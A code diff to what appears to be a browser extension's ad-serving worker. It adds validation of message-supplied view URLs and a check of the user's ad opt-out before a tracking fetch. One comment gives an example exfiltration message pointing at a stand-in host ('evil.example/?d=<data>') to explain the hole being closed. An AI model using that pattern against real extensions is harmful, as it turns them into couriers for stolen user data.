@@ -16,7 +16,7 @@
  */
 
 import { getSettings } from '../shared/settings.js';
-import { activeNetworks } from '../shared/ads/registry.js';
+import { activeNetworks, isAllowedCreativeUrl } from '../shared/ads/registry.js';
 import { decisionBody, decisionUrl, normaliseCreative } from '../shared/ads/providers.js';
 import type { AdCreative, AdSlot } from '../shared/ads/types.js';
 
@@ -70,8 +70,26 @@ export async function requestAd(slot: AdSlot): Promise<AdCreative | null> {
  *
  * The view URL is an opaque token the network minted for this creative. It
  * carries no page data because we never sent any for it to be derived from.
+ *
+ * Unlike everything else the worker fetches, this URL arrives by message, so
+ * any code that can post a runtime message can propose a destination. Without
+ * the checks below that is an exfiltration primitive — `winnow:ad-view` with
+ * `viewUrl: https://evil.example/?d=<data>` would turn the worker into a
+ * courier for whatever the sender wanted to send.
+ *
+ * So it is validated here rather than at the call site. Today's only caller
+ * passes a URL that normaliseCreative already approved, which is exactly the
+ * reasoning that makes this kind of hole survive: the guarantee lives in a
+ * different file from the fetch, and the next caller will not know that.
+ * This is the same hazard isDevEndpoint closes for the developer endpoint.
  */
 export async function countView(viewUrl: string): Promise<void> {
+  if (!isAllowedCreativeUrl(viewUrl)) return;
+
+  // Someone who switched sponsorship off has asked not to be counted; a stale
+  // message queued before the change must not count them anyway.
+  if (!(await getSettings()).adsEnabled) return;
+
   try {
     await fetch(viewUrl, {
       method: 'GET',
